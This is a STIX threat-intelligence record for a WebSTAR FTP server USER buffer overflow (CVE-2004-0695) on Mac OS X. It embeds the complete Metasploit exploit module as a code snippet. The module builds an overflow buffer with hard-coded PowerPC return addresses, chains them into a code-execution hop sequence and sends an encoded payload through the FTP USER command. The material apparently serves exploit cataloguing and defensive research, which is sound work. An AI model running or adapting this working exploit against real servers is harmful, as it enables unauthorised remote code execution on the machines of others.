{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--289a3d4b-2458-410b-9c5e-c502b724f6d7",
    "created": "2024-08-14T16:34:58.876558Z",
    "modified": "2024-08-14T16:34:58.876562Z",
    "name": "WebSTAR FTP Server USER Overflow",
    "description": " This module exploits a stack buffer overflow in the logging routine of the WebSTAR FTP server. Reliable code execution is obtained by a series of hops through the System library. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/ftp/webstar_ftp_user.rb",
            "external_id": "webstar_ftp_user.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2004-0695"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'WebSTAR FTP Server USER Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in the logging routine\n        of the WebSTAR FTP server. Reliable code execution is\n        obtained by a series of hops through the System library.\n      },\n      'Author'         => [ 'ddz', 'hdm' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2004-0695'],\n          [ 'OSVDB', '7794'],\n          [ 'BID', '10720'],\n\n        ],\n      'Privileged'     => true,\n      'Payload'        =>\n        {\n          'Space'    => 300,\n          'BadChars' => \"\\x00\\x20\\x0a\\x0d\",\n          'Compat'   =>\n            {\n              'ConnectionType' => \"+find\"\n            },\n        },\n      'Platform'      => %w{ osx },\n      'Targets'        =>\n        [\n          [\n            'Mac OS X 10.3.4-10.3.6',\n            {\n              'Platform'     => 'osx',\n              'Arch'          => ARCH_PPC,\n              'Rets'          => [ 0x9008dce0, 0x90034d60, 0x900ca6d8, 0x90023590 ],\n            },\n          ],\n        ],\n      'DisclosureDate' => '2004-07-13',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new('MHOST', [ false, \"Our IP address or hostname as the target resolves it\" ]),\n      ], self)\n  end\n\n  # crazy dino 5-hop foo\n  #$ret = pack('N', 0x9008dce0); # call $r28, jump r1+120\n  #$r28 = pack('N', 0x90034d60); # getgid()\n  #$ptr = pack('N', 0x900ca6d8); # r3 = r1 + 64, call $r30\n  #$r30 = pack('N', 0x90023590); # call $r3\n\n  def exploit\n    connect\n\n    # The offset to the return address is dependent on the length of our hostname\n    # as the target system resolves it ( IP or reverse DNS ).\n    mhost = datastore['MHOST'] || Rex::Socket.source_address(datastore['RHOST'])\n    basel =  285 - mhost.length\n\n    print_status(\"Trying target #{target.name}...\")\n\n    #  ret = 296\n    # r25  = 260\n    # r26  = 264\n    # r27  = 268\n    # r28  = 272\n    # r29  = 276\n    # r30  = 280\n    # r31  = 284\n\n    # r1+120 = 408\n\n    buf                 = rand_text_alphanumeric(basel + 136 + 56, payload_badchars)\n    buf[basel +  24, 4] = [ target['Rets'][0] ].pack('N') # call $r28, jump r1+120\n    buf[basel      , 4] = [ target['Rets'][1] ].pack('N') # getgid()\n    buf[basel + 136, 4] = [ target['Rets'][2] ].pack('N') # (r1+120) => r3 = r1 + 64, call $r30\n    buf[basel + 120, 4] = [ target['Rets'][3] ].pack('N') # call $r3\n    buf << payload.encoded\n\n    send_cmd( ['USER', buf] , true )\n    send_cmd( ['HELP'] , true )\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2004-07-13",
    "x_mitre_platforms": [
        "osx'"
    ]
}